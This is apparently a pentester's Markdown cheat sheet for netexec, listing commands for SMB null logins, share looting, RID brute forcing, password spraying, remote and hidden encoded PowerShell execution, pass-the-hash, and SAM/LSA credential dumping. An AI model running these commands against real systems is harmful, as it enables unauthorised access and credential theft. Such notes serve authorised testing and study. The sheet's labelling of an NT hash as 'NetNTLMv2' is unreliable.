---
tags:
  - smb
  - ldap
  - wmi
  - brute_forcing
---
# netexec

Enumerate services

## Capabilities

### SMB

```bash
# Null authentication
nxc smb $IP -u '' -p ''

# Anonymous authentication
nxc smb $IP -u 'a' -p ''

# Enumerate shares
nxc smb $IP -u 'a' -p '' --shares

# Spider all shares, downloading all readable files
nxc smb $IP -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
# List all files with their respective shares
cat $IP.json | jq '. | map_values(keys)'

# Brute force usernames through RIDs
nxc smb $IP -u 'a' -p '' --rid-brute 10000

# Brute force discovered users
nxc smb $IP -u users.txt -p users.txt --continue-on-success

# Password spray
nxc smb $IP -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

### Credentialed commands

```bash
# Check credentials (default to smb)
nxc smb $IP -u username -p 'Password123!'

# Execute commands (default to wmi, then smb)
nxc wmi $IP -u username -p 'Password123!' -x whoami
nxc smb $IP -u username -p 'Password123!' -x whoami
nxc smb $IP -u username -p 'Password123!' -x 'powershell -nop -w hidden -noni -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABO...'
```

NOTE: Add `--local-auth` flag to check credentials against the local user database, as opposed to the domain

Check a NetNTLMv2 hash with the following commands

Example hash:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
```

```bash
nxc smb 192.168.1.0/24 -u username -H 'NTHASH'
nxc smb 192.168.1.0/24 -u username -H 'LM:NT'
```

Applied to our example:

```bash
nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```

#### Obtaining credentials

```bash
# Dump SAM (requires Domain Admin or Local Admin Privileges with --local-auth)
nxc smb $IP -u Administrator -p 'Password123!' --sam

# Dump LSA secrets (requires Domain Admin or Local Admin Privileges with --local-auth)
nxc smb $IP -u Administrator -p 'Password123!' --lsa
```
